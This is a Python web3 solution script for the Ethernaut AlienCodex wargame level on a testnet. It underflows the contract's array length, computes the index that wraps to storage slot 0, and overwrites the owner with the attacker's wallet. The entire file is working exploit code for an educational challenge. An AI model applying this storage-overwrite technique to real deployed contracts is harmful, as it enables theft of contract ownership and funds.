import os

import solcx
from dotenv import load_dotenv
from web3 import Web3

load_dotenv()

w3 = Web3(Web3.HTTPProvider(os.getenv('PROVIDER_URL')))
if w3.is_connected():
    print("Successfully connected to the provider!")
else:
    print("Failed to connect to the given provider ", os.getenv('PROVIDER_URL'))
    exit()

# Load environment variables
_PRIVATE_KEY = os.getenv('PRIVATE_KEY')
_WALLET = w3.to_checksum_address(os.getenv('WALLET'))


def send_transaction_and_wait(transaction):
    transaction = transaction.build_transaction({
        'from': _WALLET,
        'chainId': 11155111,
        'nonce': w3.eth.get_transaction_count(w3.to_checksum_address(_WALLET))
    })
    signed_tx = w3.eth.account.sign_transaction(transaction, private_key=_PRIVATE_KEY)

    txn_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    tx_receipt = w3.eth.wait_for_transaction_receipt(txn_hash)
    assert tx_receipt['status'] == 1
    print(f'Completed transaction: {tx_receipt}')
    return tx_receipt


def get_array_length(contract_address, length_storage_index):
    length_raw = w3.eth.get_storage_at(contract_address, length_storage_index)
    return int.from_bytes(length_raw, 'big')


def compile_contract(contract_path: str, version: str, contract_name: str = None):
    # if version not in (v.public for v in solcx.get_installed_solc_versions()): solcx.install_solc(version)
    solcx.set_solc_version(version=version)
    with open(contract_path, 'r') as file:
        contract_source = file.read()

    compiled_sol = solcx.compile_source(contract_source)
    if contract_name is None:
        contract_key = next(iter(compiled_sol))
    else:
        contract_key = f'<stdin>:{contract_name}'
    contract_interface = compiled_sol[contract_key]
    print(f'Compiled {contract_path} for contract {contract_key}')
    return contract_interface

deployed_address = w3.to_checksum_address("")
compiled_contract = compile_contract("./AlienCodex.sol", '0.5.0', "AlienCodex")
alien_contract = w3.eth.contract(address=deployed_address, abi=compiled_contract['abi'])
owner1 = alien_contract.functions.owner().call()
len1 = get_array_length(alien_contract.address, 1)  # codex.length is stored at slot 1
print('Initial values:', len1, owner1)

# Step 1: Enable contact to pass security checks through modifier contacted
send_transaction_and_wait(alien_contract.functions.makeContact())
owner2 = alien_contract.functions.owner().call()
print('Got access to call codex functions')
assert alien_contract.functions.contact().call()

# Step 2: Underflow array length
send_transaction_and_wait(alien_contract.functions.retract())
len2 = get_array_length(alien_contract.address, 1)
print('values after retract:', len2, owner2)
# assert len1 < len2

# Step 3: Calculate index that targets slot 0
base_slot = w3.keccak(b'\x01'.rjust(32, b'\x00'))  # keccak256(1)
index = (2**256 - int.from_bytes(base_slot, 'big'))      # offset to hit slot 0
print('calculated index', index)

# Step 4: Overwrite slot 0 with our address
attacker_address = os.getenv('WALLET').lower().replace("0x", "").rjust(64, "0")  # left-pad to 32 bytes
receipt = send_transaction_and_wait(alien_contract.functions.revise(index, "0x" + attacker_address))

# Step 5: Verify ownership
owner3 = alien_contract.functions.owner().call()
print("✅ Owner is now:", owner3)
assert _WALLET == w3.to_checksum_address(owner3)
print('Well done, You have completed this level!!!')
